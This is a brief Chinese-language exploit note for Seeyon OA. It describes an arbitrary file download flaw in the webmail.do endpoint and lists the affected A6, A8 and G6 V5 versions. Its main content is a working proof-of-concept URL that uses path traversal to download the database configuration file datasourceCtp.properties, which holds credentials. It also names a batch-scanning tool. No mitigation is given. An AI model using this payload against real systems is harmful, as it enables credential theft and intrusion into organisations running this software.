## 漏洞概述

致远OA的webmail.do接口存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息

## 影响范围

```http
A6-V5
A8-V5
G6-V5
影响范围极广泛
```

##  POC&EXP

验证POC-下载数据库配置文件

```http
http://xxx.com/seeyon/webmail.do?method=doDownloadAtt&filename=data.txt&filePath=../conf/datasourceCtp.properties
```

批量POC

```http
大宝剑（已同步）
```

